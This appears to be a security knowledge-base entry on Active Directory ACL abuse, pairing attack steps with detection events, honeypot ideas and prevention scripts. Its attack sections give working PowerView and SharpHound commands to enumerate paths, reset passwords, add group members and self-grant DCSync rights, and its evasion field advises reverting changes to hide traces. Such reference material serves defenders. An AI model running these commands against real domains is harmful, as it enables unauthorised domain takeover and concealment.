name: Object ACL Abuse in Active Directory — BloodHound & Detection
description: AD object ACLs (Access Control Lists) control who can modify objects — users, groups, computers, GPOs. Common misconfigurations: WriteDACL, WriteOwner, GenericWrite, GenericAll on privileged objects. Attackers enumerate via BloodHound/SharpHound and exploit to reset passwords, add group members, or gain DCSync rights. Detection: Events 4738/4742/4724 for object changes, 4662 for ACL modifications.
notes:
=== BACKGROUND ===
  Every AD object has a DACL (Discretionary ACL) controlling access
  Dangerous rights on privileged objects:
    GenericAll    → full control (reset password, modify membership, etc.)
    GenericWrite  → write any non-protected property
    WriteOwner    → change object ownership (owner gets WriteDACL)
    WriteDACL     → modify the ACL itself (add yourself as owner/GenericAll)
    ForceChangePassword → reset password without knowing current
    AddMember     → add users to groups
    AllExtendedRights → grants all extended rights (password reset, etc.)

  Typical attack path BloodHound finds:
    LowPrivUser → GenericAll → DA Group → Domain Admins
    Svc_Account → WriteDACL → Domain Object → grant self DCSync rights

=== ATTACK: Collection ===
# Run SharpHound on domain-joined machine (any domain user)
.\SharpHound.exe -c All --zipfilename bh_output
  → -c All: all collection methods (ACL, ObjectProps, Trusts, etc.)
  → Creates zip archive with JSON files

# Import into BloodHound
# 1. Start BloodHound (GUI)
# 2. Upload data: Drag zip file to BloodHound or use 'Import Data'
# 3. Shortest Paths to Domain Admins → reveals ACL abuse chains

# Alternative: ADACLScanner (PowerShell)
. .\ADACLScanner.ps1
Create-ACLReport -Base 'DC=<DOMAIN>,DC=<TLD>' -RecurseLevel 5
  → Generates HTML report of all non-standard ACEs

=== ATTACK: Exploitation (generic) ===
# If attacker has GenericAll on a user — reset password
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString "<NEW_PASS>" -AsPlainText -Force)

# If attacker has GenericAll on a group — add self
Add-DomainGroupMember -Identity "<GROUP_NAME>" -Members "<YOUR_USER>"

# If attacker has WriteDACL on domain object — grant DCSync rights
Add-DomainObjectAcl -TargetIdentity <DOMAIN> -PrincipalIdentity <YOUR_USER> -Rights DCSync

=== DETECTION ===
Event 4738: 'A user account was changed'
  → Logged when any user account attribute is modified (password, flags, groups, etc.)
  → Does NOT show what specifically changed
  → Alert: privileged account modified by non-admin

Event 4742: 'A computer account was changed'
  → Same as 4738 but for computer objects

Event 4724: 'An attempt was made to reset an account's password'
  → Logged when someone resets another account's password
  → Admin resetting SA or vice-versa = suspicious

Event 4662: 'An operation was performed on an object'
  → Logged when object ACL is modified (if SACL auditing enabled)
  → Filter for DACL modification GUIDs

Honeypot ACL:
  → Create a user with GenericAll on another dummy object
  → Alert on any 4738/4724 for honeypot user objects
  → Any modification = attacker followed BloodHound path

=== PREVENTION ===
  → Run ADACLScanner quarterly, alert on new non-standard ACEs
  → Tier model: never grant admin rights at lower tiers
  → Protected Users group prevents delegation/use of NTLM for privileged accounts
  → Enable 'Audit Directory Service Access' (Success + Failure)

defense.why_it_works: Every AD object has a DACL. Excessive rights (GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMember, AllExtendedRights) on privileged objects let an attacker reset passwords, add group members, or grant themselves DCSync — turning a low-priv foothold into domain admin along a BloodHound path.
defense.prerequisites: Control of a principal that holds a dangerous ACE over a more-privileged object (found via BloodHound/SharpHound or ADACLScanner).
defense.impact: Privilege escalation along the ACL chain — password resets, group membership changes, or self-granted DCSync rights leading to domain compromise.
defense.detection: Event 4738/4742 (user/computer account changed), 4724 (password reset attempt), and 4662 (operation on an object, for DACL modifications with SACL auditing enabled). Alert when a privileged account is modified by a non-admin, or a honeypot object with a dangling ACE is touched.
defense.artifacts: 4738/4742/4724/4662 events tied to non-admin principals; SharpHound collection zip on the attacker host; PowerView Add-DomainObjectAcl / Set-DomainUserPassword execution.
defense.prevention: Run ADACLScanner quarterly and alert on new non-standard ACEs; enforce an AD tier model (no admin rights at lower tiers); add privileged accounts to Protected Users; enable 'Audit Directory Service Access' (Success + Failure).
defense.misconfiguration: AD objects (users, groups, OUs, GPOs) have overly permissive ACEs granting non-privileged users GenericAll, GenericWrite, WriteDACL, WriteOwner, or ExtendedRight (ForceChangePassword, AddMember). Because AD ACEs are not prominently visible in standard tools and can be inherited from parent OUs, these misconfigurations accumulate over time — especially after large provisioning events or mergers.
defense.vulnerable_config:
# Finding objects where Domain Users have dangerous rights:
Get-DomainObjectAcl -ResolveGUIDs |
    Where-Object {
        $_.IdentityReference -eq 'CORP\Domain Users' -and
        $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner'
    }

# Or via BloodHound:
# 'Shortest Paths to Domain Admins from Domain Users' query
# Shows every ACE path from low-privilege to DA
defense.secure_config:
# Remove dangerous ACEs using PowerView:
Remove-DomainObjectAcl -TargetIdentity 'Domain Admins' \
    -PrincipalIdentity 'Domain Users' -Rights GenericWrite

# Quarterly ACL audit script:
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDACL|WriteOwner' -and
    $_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'
} | Export-Csv acl_audit_$(Get-Date -f yyyyMMdd).csv

# Enable AD Recycle Bin and Protected Users group
# Use Tiered Administration model to limit blast radius of any single compromise
# Enable MDI (Microsoft Defender for Identity) — detects ACL abuse chains
defense.evasion: Make the DACL/attribute change, use it, then REVERT it (remove the added SPN/rights) to erase the persistence artifact; a single scoped edit is low-signal without object auditing.
